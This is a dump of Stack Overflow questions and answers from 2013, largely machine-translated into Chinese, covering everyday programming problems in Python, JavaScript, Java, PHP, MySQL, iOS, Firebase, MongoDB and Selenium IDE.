> C:/RailsInstaller/Ruby1.9.3/lib/ruby/site_ruby/1.9.1/rubygems/remote_fetcher.rb:321:in``request' from C:/RailsInstaller/Ruby1.9.3/lib/ruby/site_ruby/1.9.1/rubygems/remote_fetcher.rb:203:in``fetch_path' from C:/RailsInstaller/Ruby1.9.3/lib/ruby/site_ruby/1.9.1/rubygems/spec_fetcher.rb:265:in``block in list' from C:/RailsInstaller/Ruby1.9.3/lib/ruby/site_ruby/1.9.1/rubygems/spec_fetcher.rb:227:in`每个'来自 C:/RailsInstaller/Ruby1.9.3/lib/ruby/site_ruby/1.9.1/rubygems/spec_fetcher.rb:227:in `list'

可能是什么问题？？

# python - 没有任何进口或内置功能的替代品？

> ID：15562238
> 
> 赞同：0
> 
> 时间：2013-03-22T03:31:34.557
> 
> 标签：python

这是一个家庭作业问题。我正在定义一个函数，它接受一个单词并将给定的字符替换为另一个字符。例如 replace("cake","a","o") 应该返回我试过的 "coke"

```
def replace(word,char1,char2):
    newString = ""
    for char1 in word:
        char1 = char2
        newString+=char1
    return newString  #returns 'oooo' 
```

和

```
def replace(word,char1,char2):
    newString = ""
    if word[char1]:
        char1 = char2
        newString+=char1
    return newString  #TypeError: string indices must be integers, not str 
```

我假设我的第一次尝试更接近我想要的。我的功能出了什么问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T03:35:19.563

Try this:

```
def replace(word,char1,char2):
    newString = ""
    for next_char in word:         # for each character in the word
        if next_char == char1:     # if it is the character you want to replace
            newString += char2     # add the new character to the new string
        else:                      # otherwise
            newString += next_char # add the original character to the new string
    return newString 
```

Although strings in python already have a method that does this:

```
print "cake".replace("a", "o") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T03:46:09.977

```
def replace(word, ch1, ch2) :
    return ''.join([ch2 if i == ch1 else i for i in word]) 
```

# javascript - 值更改时不显示剔除

> ID：15562239
> 
> 赞同：1
> 
> 时间：2013-03-22T03:31:37.517
> 
> 标签：javascript, knockout.js

如果大于某个值，我正在尝试使用敲除来隐藏文本。出于某种原因，我无法让它工作。当我单击测试按钮时，第二个文本字段应显示..

```
<body class="calc" onLoad="createnav()">
<input type="button" value="test" />

<p data-bind="text: 'This shows', if: 6 > 4" ></p>
<br>    
<p data-bind="text: 'This does Not', if: 6 > qty"></p> 
```

这是脚本：

```
function AppViewModel() {
  this.qty = ko.observable("1"); } 
  // Activates knockout.js 
  var app = new AppViewModel(); ko.applyBindings(app);

//When I click button I want the name to change
$('input[type=button]').click( function() {
  var sum = '5';
  app.qty(sum);
}); 
```

[http://jsfiddle.net/d577K/44/](http://jsfiddle.net/d577K/44/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T03:45:47.423

正如其他人指出的那样，您正在比较可观察对象`qty`而不是其值`qty()`

但您也可能需要考虑将您的文本设置为计算

[小提琴示例](http://jsfiddle.net/d577K/47/)

```
<p data-bind="text: output"></p>

function AppViewModel() {
    var self = this;
    this.qty = ko.observable("1");
    this.output = ko.computed(function(){
        return (6 > self.qty()) ? "This shows too" : "";
    });
} 
```

这是一种更像淘汰赛的做事方式，并且提供了将逻辑保留在视图模型中而不是将其混合到标记中的优势。

这样做的其他优点之一是，您可以在调试时清楚地看到您的 javascript 值，并注意到 qty 是一个函数而不是一个数字。

如果您想在多个位置显示它，它还允许您重复使用此值而无需重复计算。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T03:40:34.863

您需要访问 qty observable 的值：

`<p data-bind="text: 'This does Not', if: 6 > qty()"></p>`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T03:41:03.777

简单的，

```
<p data-bind="text: 'This does Not', if: 6 > qty()"></p> 
```

在表达式中使用可观察属性时，不能使用声明性绑定（无括号）

# python - 从字符串创建元组列表 (x, y)

> ID：15562240
> 
> 赞同：1
> 
> 时间：2013-03-22T03:31:41.910
> 
> 标签：python, numpy

我有一个形式的字符串：

> 多边形 ((159.5 534.5, 157.5 535.5, 157.5 554.5, 155.5 557.5,...))

我想将它转换为这样的元组列表：

> [(159.5, 534.5), (157.5, 535.5), (157.5, 554.5), (155.5, 557.5), ...]

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T03:36:36.557

像一个选项，你可以试试这个：

```
data = "POLYGON ((159.5 534.5, 157.5 535.5, 157.5 554.5, 155.5 557.5))"
print [tuple(map(float, x.split())) for x in data.replace('POLYGON ((', '').replace('))', '').strip().split(', ')] 
```

或者没有列表理解：

```
data = data.replace('POLYGON ((', '').replace('))', '').strip()
res = []
for rec in data.split(', '):
    res.append(tuple(float(val) for val in rec.split())) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T03:41:01.623

```
>>> re.findall(r'([\d\.]+)\s([\d\.]+)', the_string)
[('159.5', '534.5'), ('157.5', '535.5'), ('157.5', '554.5'), ('155.5', '557.5')] 
```

然后只需将每个项目转换为浮动

# firebase - 持久会话？

> ID：15562252
> 
> 赞同：2
> 
> 时间：2013-03-22T03:32:57.163
> 
> 标签：firebase

如果我错了，请纠正我，但身份验证会话有 30 天的最大限制？如果是这种情况，有没有办法让我的服务器节点应用程序监听经过身份验证的 dataRef 永远存在？

干杯，特拉夫。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-24T18:17:56.567

由于[on 方法有一个取消回调](https://www.firebase.com/docs/javascript/firebase/on.html)，该回调在任何时候权限被撤销（即身份验证过期）时都会被调用，所以这里有一种（未经测试的）处理持久连接的可能性：

```
var fb = new Firebase(URL_AND_PATH);
fb.auth( TOKEN, restart );

function _childAdded(ss) {
   /* do something with data */
}

function _authRevoked() {
   fb.unauth();
   fb.auth( TOKEN, restart );
};

function restart(error) {
   if( error ) { console.error(error); }
   else {
      fb.on('child_added', _childAdded, _authRevoked );
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T21:09:32.077

除了 Kato 的建议之外，您可以做的是通过传入您的全局 Firebase 密码进行身份验证（在 Forge -> Auth -> Firebase Secrets -> “Show”中可用）。这只能在受信任的环境中使用（例如您的后端服务器），因此请确保不要通过将其签入源代码控制、将其传递给您的客户端代码/最终用户等来泄漏它。这只会“ expire”，如果秘密被撤销。

# python - 与 python 的 SSH 连接

> ID：15562253
> 
> 赞同：0
> 
> 时间：2013-03-22T03:33:00.823
> 
> 标签：python, ssh

我想制作一个与 SSH 服务器连接的 python 脚本，但由于我无法将密码作为 发送`argv`，我该怎么做？

```
os.system("user@server password") 
```

如果失败了，回报会是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T03:34:47.130

您可能应该考虑使用库或包装器来执行此操作，以使其正常工作并获得更多支持。下面是一些[例子](http://wiki.python.org/moin/SecureShell)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T03:35:40.130

您可以使用一些第 3 个库，例如[fabric](http://docs.fabfile.org/en/1.6/)或[Paramiko](http://jessenoller.com/2009/02/05/ssh-programming-with-paramiko-completely-different/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T07:14:00.340

使用帕拉米科：

```
client = paramiko.SSHClient()
client.connect('my.example.com', username='brandon', password=mypass) 
```

# ios - 动画未触发

> ID：15562256
> 
> 赞同：0
> 
> 时间：2013-03-22T03:33:20.040
> 
> 标签：ios, objective-c, animation

我有一个简单的爆炸动画，可以在我班上的任何方法中正常工作。但是，一旦计时器用完，我想从计时器更新方法中调用它。问题是无论出于何种原因它都无法从这里工作（肯定与计时器有关）。它只是取消隐藏我的图像.. 没有动画。我无法弄清楚如何让它工作。

```
- (void)explosionAnimation
{
    imgExplosion.hidden=FALSE;

    //set starting point of explosion
    CGRect explosionFrame = self.imgExplosion.frame;
    explosionFrame.origin.x = explosionFrame.origin.y = -960.0f;
    explosionFrame.size.width = explosionFrame.size.height = 1920.0f;

    [UIView animateWithDuration:1.5f animations:^{
        self.imgExplosion.frame = explosionFrame;
    } completion:^(BOOL finished) {
        self.imgExplosion.hidden = YES;
    }];
}

-(void) createTimer
{
    // Create timer instance
    if (timer != nil){

        [timer invalidate];
        hasTimerStarted = NO;
    }

    // Initialize the timer.
    timer = [NSTimer scheduledTimerWithTimeInterval:1.0
                                           target:self
                                           selector:@selector(timerUpdater)
                                           userInfo:nil repeats:YES];
}

- (void)timerUpdater{

    if(!hasTimerStarted){
        intTotalSeconds = [strTotalNumberofSeconds intValue];

        hasTimerStarted = YES;
    }
    else{
        intTotalSeconds--;

        self.lblTimer.text = [self revertTimeToString:intTotalSeconds];
    }

    // if totalSeconds hits zero, then time is up! You lose!
    if (intTotalSeconds == 0){
        [timer invalidate];

        [self explosionAnimation];

        hasTimerStarted = NO;

        [self addPlayAgainButton];
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T03:48:58.240

尝试在主线程上放置一些延迟或调用爆炸方法，例如

```
[self performSelector:@Selector(explosionAnimation) withObject:nil afterDelay:1.0]; 
```

# visual-studio-2010 - 如果我想在同一个工作区中复制我的 c# 项目，我该怎么做？

> ID：15562257
> 
> 赞同：6
> 
> 时间：2013-03-22T03:33:23.330
> 
> 标签：visual-studio-2010, visual-studio, projects-and-solutions

换句话说，假设我已经使用 Visual Studio 完成了一个项目。现在我想制作一个与已经完成的项目相同的单独项目（除了一些未来的变化）。

我怎样才能做到这一点，同时将新项目保持在与原始项目相同的工作区中，而无需：

*   创建一个新项目并复制粘贴代码
*   复制粘贴包含项目的文件夹并更改文件夹的名称

我问是因为必须有比上述两个选项更好的方法来做到这一点。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2017-06-23T16:09:05.053

1.  右键单击解决方案和“在文件资源管理器中打开文件夹”
2.  复制项目文件夹
3.  重命名新的项目文件夹
4.  打开新项目文件夹并重命名 .csproj 文件
5.  右键单击解决方案并将“添加”“现有项目”添加到解决方案
6.  打开新项目的“属性”
7.  在“应用程序”下，更改程序集名称和默认命名空间
8.  选择“工具”、“创建 GUID”、选项 6、“复制”
9.  在组装信息下，更改名称和产品
10.  粘贴 GUID 并清除“”后缀
11.  重命名源文件中的命名空间以反映上面的新命名空间。

根据您的需要，您可以使用这些步骤的子集（例如步骤 1 和 2），但是，我认为完整的副本需要提到的所有步骤。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-22T03:40:43.280

第二个选项*正是*您应该做的：复制包含您的项目的文件夹，然后重命名它。

要完成这项工作，您可能还必须更改项目使用的 GUID 以避免冲突。如果解决方案中已经存在具有相同 GUID 的另一个项目，Visual Studio 应该会自动执行此操作。如果出现问题，您可以通过编辑项目文件（它是名为 ProjectGUID 的字段）手动完成。它只是一个标准的 GUID 值，因此请使用任何免费提供的 GUID 生成器，例如与 Visual Studio 捆绑的 GUID 生成器或您在网上找到的 GUID 生成器。

为什么会有比这更好的选择？那个“更好”的选择会是什么样子？它不像会有一个菜单命令，这不是一个非常常用的功能。大多数程序员使用源代码控制系统自动为他们处理分支/复制，并且[大部分]没有痛苦。

# java - Java 中的正则表达式帮助

> ID：15562263
> 
> 赞同：-3
> 
> 时间：2013-03-22T03:33:43.037
> 
> 标签：java, regex

我需要一个可以验证字符串是否符合以下条件的正则表达式。

*   字符串必须仅由大写字母组成。
*   它必须包含最少 6 个字符，最多 20 个字符。
*   它必须以子字符串开头 - ROLE（仅限大写），后跟 ROLE_ 等下划线字符
*   下划线字符**不能**出现在字符串的末尾（也不能出现在开头）。
*   其余字符只能是大写字母和下划线的组合，例如 ROLE_ADMIN、ROLE_USER、ROLE_AGENT_USER。
*   不允许使用两个或多个连续的下划线。

由于我对正则表达式知之甚少，因此到目前为止我尝试的示例几乎是不可接受的，我觉得它们完全没有必要在这里展示。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T03:47:48.353

这是我的正则表达式。

```
(?!.*__.*)(?!.*_$)(ROLE_[A-Z_]{1,15}) 
```

这是它的作用：

*   前面的那些部分称为[*负前瞻。*](http://www.regular-expressions.info/lookaround.html) 如果字符串中有两个以上连续的下划线，或者末尾有一个，他们会拒绝该字符串。
*   下一组匹配逐字字符串`ROLE_`，然后是任何其他字符 AZ 和下划线，至少一次但不超过 15 次。这将整个字符串长度保持在 20 或更少。

[这是 Debuggex 上的样子。](http://www.debuggex.com/?re=%28%3F%21.%2A__.%2A%29%28%3F%21.%2A_%24%29%28ROLE_%5BA-Z_%5D%7B1%2C15%7D%29&str=)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-22T04:03:37.670

IMO，使用正则表达式检查字符串的长度使其变得复杂，但您可以使用以下内容：

```
^ROLE_(([A-Z]+_)*[A-Z]+)(?<!.{21})$ 
```

`(?<!.{21})`如果字符串的长度超过 20，则基本上拒绝该字符串

[这](http://rubular.com/r/f6PPFGm8Eg)是一个关于 Rubular 的演示。

* * *

如果您的正则表达式风格不支持负面的lookbehinds，您可以使用

```
^(?!.{21,})ROLE_(([A-Z]+_)*[A-Z]+)$ 
```

`(?!.{21,})`做同样的事情，`(?<!.{21})`但首先检查长度。

[这](http://rubular.com/r/o6saoaG5Fw)是一个关于 Rubular 的演示。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-22T03:37:31.357

这应该可以解决问题：

```
ROLE(_[A-Z]+)+ 
```

这不会限制最大长度，但我认为这是最接近的。

# java - 在java中检查字符串中的字母

> ID：15562265
> 
> 赞同：1
> 
> 时间：2013-03-22T03:34:20.283
> 
> 标签：java

我有一个字符串“BC+D*E-”。我想检查字符串的每个字符是否是字母表。我尝试使用 isLetter() 但它确实将 = 、 * 和 - 视为字母表。您能帮帮我吗？提前致谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-22T03:40:05.007

尝试

```
 String s = "BC+D*E-=";

    for (int i = 0; i < s.length(); i++) {
        char charAt2 = s.charAt(i);
        if (Character.isLetter(charAt2)) {
            System.out.println(charAt2 + "is a alphabet");
        }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T03:41:15.343

使用[Wrapper 类](http://en.wikipedia.org/wiki/Primitive_wrapper_class) [Character#isLetter(char)](http://docs.oracle.com/javase/7/docs/api/java/lang/Character.html#isLetter%28char%29)方法

```
Character.isLetter(char c); 
```

并一次检查每个字母。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T03:42:51.843

这个片段可以帮助你。

```
 String startingfrom = "BC+D*E-".toUpperCase();
        char chararray[] = startingfrom.toCharArray();
        for(int i = 0; i < chararray.length; i++) {
                            int value = (int)chararray[i];
                            if((value >= 65 && value <= 90) || (value >= 97 && value <= 122))
                                System.out.println(chararray[i]+ " is an alphabate");
                            else 
                                System.out.println(chararray[i]+ " is not an alphabate");
        } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T03:39:37.883

将字符串分解为一个数组并对其进行迭代。

```
String word = "BC+D*E-"
for (char c : word.toCharArray()) {
    if(!(Character.isLetter(c)) {
        System.out.println("Not a character!");
        break;
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-22T03:42:00.487

您可以使用英文字母的 ASCII 值。例如

```
for (char c : "BC+D*E-".toCharArray())
{
  int value = (int) c;
  if ((value >= 65 && value <= 90) || (value >= 97 && value <= 122))
  {
    System.out.println("letter");
  }
} 
```

你可以在这里找到 ASCII 表：[http ://www.asciitable.com/](http://www.asciitable.com/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-22T05:09:04.670

```
String stringEx =  "BC+D*E-";
for (char string : stringEx.toCharArray()) {
    if ( ( (char)string > 64 ) && ((char)string < 91) )
        System.out.println("It is character");
    if ( ( (char)string > 96 ) && ((char)string < 123) )
    System.out.println("It is character");
} 
```

您可以使用此代码。这也可能对您有所帮助。

# php - base_url().'assets/ works giving css/images/js location but js is not running in codeigniter

> ID：15562268
> 
> 赞同：0
> 
> 时间：2013-03-22T03:34:36.850
> 
> 标签：php, javascript, css, codeigniter

I have this structure

```
/www
    /code_igniter
        /application
        /assets
            +img
            +css
            +js
        /controllers
        /system 
```

I load two views in controller:

```
class Control extends CI_Controller {
    function __construct()
    {
        parent::__construct();
        $this->load->database();
        $this->load->helper('url');  

    }
     public function index()
    {
         $this->load->view('header');
     $this->load->view('body');
    }

} 
```

In header view I do:

```
<link type="text/css" rel="stylesheet" href='<?echo base_url().'assets/'?>css/stile.css' />
<link type="text/css" rel="stylesheet" href='<?echo base_url().'assets/'?>css/chosen.css' />

<script src="<?echo base_url().'assets/'?>js/jquery.min.js" type="text/javascript"></script>
<script src="<?echo base_url().'assets/'?>js/mousewheel.js" type="text/javascript"></script>
<script src="<?echo base_url().'assets/'?>js/easing.js" type="text/javascript"></script>
<script src="<?echo base_url().'assets/'?>js/logic.js" type="text/javascript"></script> 
```

body has pure html.

when I see source code of generated view It can find the js, css and images but for some strange reason it is not executing the js as if it would not find them...

I tested locally and it works!!

To try to reproduce error I renamed js folfer and yeah, it shows the same result as when testing on server, i then rename it to js and works locally but not in server...

Do you know what could be causing this? Is driving me crazy

Could it be a crach between jquery.min.js ? It is like is not running anything,

I also find this issue I am loading [http://rhinoslider.com/](http://rhinoslider.com/) in a script in header view

```
 $(document).ready(function() {
           alert("a");
       $('#slider').rhinoslider({
        controlsPlayPause: false,
                showControls: 'always',
                showBullets: 'always',
                controlsMousewheel: false,                   
        slidePrevDirection: 'toRight',
        slideNextDirection: 'toLeft'
            });

           alert("b");          
        $(".rhino-prev").hide();                
        $('.rhino-next').after('<a class="form-submit" href="#" >Next</a>');
                $(".rhino-next").hide();
      alert("c");       

        }); 
```

And I am only receiving alert a message, it is not executing or [loading rhino slider](http://rhinoslider.com/) why could it be ?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:49:05.500

尝试这个 ：

```
 <link type="text/css" rel="stylesheet" href='<?php echo base_url().'assets/'?>css/stile.css' />
  <link type="text/css" rel="stylesheet" href='<?php echo base_url().'assets/'?>css/chosen.css' />

  <script src="<?php echo base_url().'assets/'?>js/jquery.min.js" type="text/javascript"></script>
  <script src="<?php echo base_url().'assets/'?>js/mousewheel.js" type="text/javascript"></script>
  <script src="<?php echo base_url().'assets/'?>js/easing.js" type="text/javascript"></script>
  <script src="<?php echo base_url().'assets/'?>js/logic.js" type="text/javascript"> 
```

或**设置**

```
 short_open_tag = On 
```

在**php.ini**文件中，以使短标签在您的本地主机上工作

希望它会有所帮助！

# php - PHP date('W') vs MySQL YEARWEEK(now())

> ID：15562270
> 
> 赞同：14
> 
> 时间：2013-03-22T03:34:42.140
> 
> 标签：php, mysql, date, week-number

Can someone kindly explain me why these two give different results?

I execute this with PHP.

```
date("YW",mktime(0, 0, 0, 3, 22 , 2013)); // outputs 201312 
```

And when I execute this with MySQL

```
SELECT YEARWEEK(now()); // outputs 201311 
```

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2013-03-22T03:43:47.070

您需要在 mysql YEARWEEK 调用中指定模式 3：

```
SELECT YEARWEEK(now(),3); 
```

PHP`date()`占位符`W`根据[ISO 8601 规范](http://en.wikipedia.org/wiki/ISO_8601#Week_dates)返回周数。这意味着周从星期一（不是星期日）开始，一年中的第一周是第 1 周（不是 0），并且该周是第一个在新年中有超过一半天数的周（所以它必须是一月星期四）。根据[MySQL WEEK 函数的文档，该](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_week)选项组合是模式 3。

此外，将 Alles 的注释拉到接受的答案中，因为它很重要：占位符`Y`和`W`不要放在一起。如果您想要与 ISO 周数一起使用的年份，您应该使用`o`而不是`Y`. 例如，考虑从 2014 年 12 月 29 日星期一开始的那一周：

```
date('YW', mktime(0,0,0,12,29,2014));  #=> 201401 : 1st week of 2014??
date('oW', mktime(0,0,0,12,29,2014));  #=> 201501 : better 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-03-24T23:32:45.813

请注意 YEARWEEK('2012-01-01', 3) => 201152 而 PHP "YW" 将给出 201252。结果中的年份可能与第一个和最后一个日期参数中的年份不同一年中的一周。（即 YEARWEEK 中的年份是一周中星期一的年份，而不是用于计算的日期的年份）。

为了得到正确的结果，你需要做

```
date("oW",mktime(0, 0, 0, 1, 1, 2012)); // outputs 201152 
```

因为“o”给你一周所属的年份。

我希望这有帮助。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-22T03:44:44.633

[`YEARWEEK`](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_week)接受第二个（可选）参数，指定周的范围 [0-53] 或 [1-53]）。

> 此函数返回日期的周数。**WEEK() 的双参数形式使您可以指定星期是从星期日还是星期一开始，以及返回值是否应在 0 到 53 或 1 到 53 的范围内。**如果省略 mode 参数，则返回值使用 default_week_format 系统变量。

while`date(W)`是一个始终在 [01-53] 范围内的[ISO8601 日期。](http://en.wikipedia.org/wiki/ISO_8601)因此我的猜测是，默认情况下 YEARWEEK 使用 [0-53] 范围。

因此，如果您想获得相同的结果，请尝试使用 1 作为第二个参数`YEARWEEK`

# c# - Accessing WCF service sql membership provider from client

> ID：15562272
> 
> 赞同：0
> 
> 时间：2013-03-22T03:34:42.777
> 
> 标签：c#, asp.net, .net, wcf, membership-provider

I have created a WCF service that is used for authentication. It uses an asp.net SQL membership provider for the accounts.I need a way for the client application to be able to register an account, change password ETC. The way I had originally planned and have started doing was basically interfacing the code within the service by creating matching methods that I could call from the client.

For instance to create the user I would create a method that has all the needed parameters and then within the code body I would access the membership provider so the client could just pass the details into it. So it is all actually done from within the same project/service.

Now that I have started I have began to wonder if I can access the sql membership provider directly from the client so I don't have to waste my time and interface the code.

If so could anyone point me in the right direction on how exactly I create an instance of the sql membership provider in another project so I can access it?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:00:34.930

Microsoft has a standard framework that is targeted at what you're trying to do, it's called Client Application Services. There's a walkthrough [on the MSDN site](http://msdn.microsoft.com/en-us/library/bb546195%28v=vs.100%29.aspx)

# node.js - how can I access the uploadDir attribute of express?

> ID：15562273
> 
> 赞同：3
> 
> 时间：2013-03-22T03:34:46.233
> 
> 标签：node.js, express, connect, formidable

In express app.js I define **uploadDir = "./tmp"**, but how can I access it later?

```
app.configure(function(){
  app.set('port', process.env.PORT || 3000);
  app.set('views', __dirname + '/views');
  app.set('view engine', 'jade');
  app.use(express.favicon());
  app.use(express.logger('dev'));

  app.use(express.bodyParser({uploadDir:'./tmp', keepExtensions: true})); // <--

  app.use(express.methodOverride());
  app.use(app.router);
  app.use(express.static(path.join(__dirname, 'public')));
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T04:26:32.637

中间件的参数`bodyParser`直接进入中间件。所有的 Express 中间件都是由 Connect 提供的，所以它甚至对 Express 一无所知。被`uploadDir`捕获在[多部分中间件](https://github.com/senchalabs/connect/blob/master/lib/middleware/multipart.js)`multipart`的闭包中。它通过闭包存储，从不存储在其他任何地方，也不会传递给 Express，因此访问原始值的唯一方法是将其作为最初传入的对象的一部分进行访问。没有其他方法。`options`

如果您希望通过阅读`app`（正如您在评论中所说）来访问该值，那么您应该自己单独设置它。也就是说，这种方法有点难看，意味着您必须设置两次值。

```
app.set('uploadDir', './tmp'); 
```

# selenium-ide - How to replace text to the right side?

> ID：15562276
> 
> 赞同：0
> 
> 时间：2013-03-22T03:34:48.740
> 
> 标签：selenium-ide

```
[info] echo: AB: 889614 | YX: 43 | ZY: 889571
[info] Executing: |store | javascript{storedVars.BLA.replace('AB: ','')} | BLA2 |
[info] Executing: |store | javascript{storedVars.BLA2.replace(' |-','')} | BLA3 |
[info] Executing: |echo | ${BLA3} | |
[info] echo: 889614 | YX: 43 | ZY: 889571 
```

How to can in Selenium IDE - HTML replace the text to the right side?

I like get only the first number in a variable.

Can someone show me an example of how to do this?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-23T04:25:58.527

您想拆分句子并仅存储数值。使用下面的代码

```
 <tr>
    <td>store</td>
    <td>AB: 889614 | YX: 43 | ZY: 889571</td>
    <td>num1</td>
  </tr>

 <tr>
    <td>store</td>
    <td>1</td>
    <td>dim</td>
 </tr>
 <tr>
    <td>store</td>
    <td>javascript{storedVars['num1'].split('AB:')[storedVars['dim']]}</td>
    <td>num2</td>
 </tr>
 <tr>
    <td>store</td>
    <td>0</td>
    <td>dim1</td>
 </tr>
 <tr>
    <td>store</td>
    <td>javascript{storedVars['num2'].split('| ')[storedVars['dim1']]}</td>
    <td>num3</td>
 </tr>
 <tr>
    <td>echo</td>
    <td>${num3}</td>
    <td></td>
 </tr>
 <tr>
    <td>store</td>
    <td>1</td>
    <td>dim2</td>
 </tr>
 <tr>
    <td>store</td>
    <td>javascript{storedVars['num1'].split('YX:')[storedVars['dim2']]}</td>
    <td>num4</td>
 </tr>
 <tr>
    <td>echo</td>
    <td>${num4}</td>
    <td></td>
 </tr>
 <tr>
    <td>store</td>
    <td>0</td>
    <td>dim3</td>
 </tr>
 <tr>
    <td>store</td>
    <td>javascript{storedVars['num4'].split('| ')[storedVars['dim3']]}</td>
    <td>num5</td>
 </tr>
 <tr>
    <td>echo</td>
    <td>${num5}</td>
    <td></td>
  </tr>
  <tr>
    <td>store</td>
    <td>1</td>
    <td>dim4</td>
  </tr>
  <tr>
    <td>store</td>
    <td>javascript{storedVars['num1'].split('ZY:')[storedVars['dim4']]}</td>
    <td>num6</td>
  </tr>
  <tr>
    <td>echo</td>
    <td>${num6}</td>
    <td></td>
 </tr> 
```

在 selenium ide 中执行上述命令

```
 [info] Executing: |store | AB: 889614 | YX: 43 | ZY: 889571 | num1 |
       [info] Executing: |store | 1 | dim |
       [info] Executing: |store | javascript{storedVars['num1'].split('AB:')[storedVars['dim']]} | num2 |
       [info] Executing: |store | 0 | dim1 |
       [info] Executing: |store | javascript{storedVars['num2'].split('| ')[storedVars['dim1']]} | num3 |
       [info] Executing: |echo | ${num3} | |
       [info] echo: 889614
       [info] Executing: |store | 1 | dim2 |
       [info] Executing: |store | javascript{storedVars['num1'].split('YX:')[storedVars['dim2']]} | num4 |
       [info] Executing: |echo | ${num4} | |
       [info] echo: 43 | ZY: 889571
       [info] Executing: |store | 0 | dim3 |
       [info] Executing: |store | javascript{storedVars['num4'].split('| ')[storedVars['dim3']]} | num5 |
       [info] Executing: |echo | ${num5} | |
       [info] echo: 43
       [info] Executing: |store | 1 | dim4 |
       [info] Executing: |store | javascript{storedVars['num1'].split('ZY:')[storedVars['dim4']]} | num6 |
       [info] Executing: |echo | ${num6} | |
       [info] echo: 889571 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T05:30:52.870

所以如果你正在寻找`889614` 从

```
AB: 889614 | YX: 43 | ZY: 889571 
```

然后您可以尝试以下解决方案 -

```
store | AB: 889614 | YX: 43 | ZY: 889571  | var1
store | 1 | delimiter
store | javascript{storedVars['var1'].split('AB:')[storedVars['delimiter']]} | var2
store | 0 | delimiter1
store | javascript{storedVars['var2'].split('| ')[storedVars['delimiter1']]}  |variable
echo  | ${variable} 
```

# android - Adding keyword on android apk file when uploading google play store

> ID：15562278
> 
> 赞同：1
> 
> 时间：2013-03-22T03:35:00.453
> 
> 标签：android

I uploaded the apk file to google play store. But i cannot find my project from google play store when i search my package name. How can i do for searching on google play store to detect my application.?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-30T11:35:50.470

例如，如果您的应用程序名称是 The Best Application Of The World，并且您正在使用 Google Plays 搜索，那么它可能不会在搜索结果中显示您的应用程序。但是，如果您在名称中加上“世界上最好的应用程序”之类的引号，那么 Google Play 搜索应该只显示您的应用程序，而不会显示其他任何内容（如果已发布）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:38:04.870

首先确保您的应用程序成功**发布在****google play 控制台**的右侧。

 **如果成功发布，那么它将在`1-24`几个小时内出现。

我认为这与`Google's server traffic`（许多应用程序正在等待处理以接受请求）有关。

很高兴它很快就会出现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-09T15:52:58.523

这些应用程序通常会在几个小时内发布，但更新搜索系统可能需要更长的时间，这就是为什么您有时无法在发布后立即搜索它的原因。

如果您想在应用发布后访问应用，请使用应用包的反向域名：

```
https://play.google.com/store/apps/details?id=com.mycompany.myapplication 
```**

# ruby - Mongo::OperationFailure - need to login when using from_uri

> ID：15562279
> 
> 赞同：3
> 
> 时间：2013-03-22T03:35:02.100
> 
> 标签：ruby, mongodb, heroku, mlab

My goal is to connect with my heroku/mongolab database but I keep getting this error:

```
Mongo::OperationFailure at /mongotest/a/b
: need to login
file: networking.rb
location: send_message_with_gle
line: 89 
```

The code I'm using is:

```
client = Mongo::MongoClient.from_uri(ENV['MONGOLAB_URI'])
db   = client.db('test')
testcoll = db['testcoll']
testcoll.insert({:'_id' => "def", :'test' => "woop de doop"})
testcoll.find() 
```

`ENV['MONGOLAB_URI']=mongodb://heroku_app########:password@ds0xxxxx.mongolab.com:xxxxx/heroku_app########`

I know that the uri is correct and contains the username and password, so why the error? Also, the error occurs on the insert() line, not the line where I authenticate.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T03:35:02.100

Welp, turns out the url connects me to the `heroku_app########` database, but I'm then trying to access the database called `test` so obviously I'm not authenticated. Would have been nice Mongo had returned an error specifying that I had logged in but not to the right database. Oh well.

I hadn't paid enough attention to the format of the uri, which is

```
mongodb://username:password@host:port/database 
```

The database part is... pretty important, it turns out.

(I actually found the answer to this while writing the test, but if this answer had existed it might have saved me an embarrassingly large amount of time, so I'm writing it again and answering it myself.)

# mongodb - cannot get mongodb connected with scrapy-linkedin

> ID：15562282
> 
> 赞同：1
> 
> 时间：2013-03-22T03:35:18.710
> 
> 标签：mongodb, python-2.7, scrapy

```
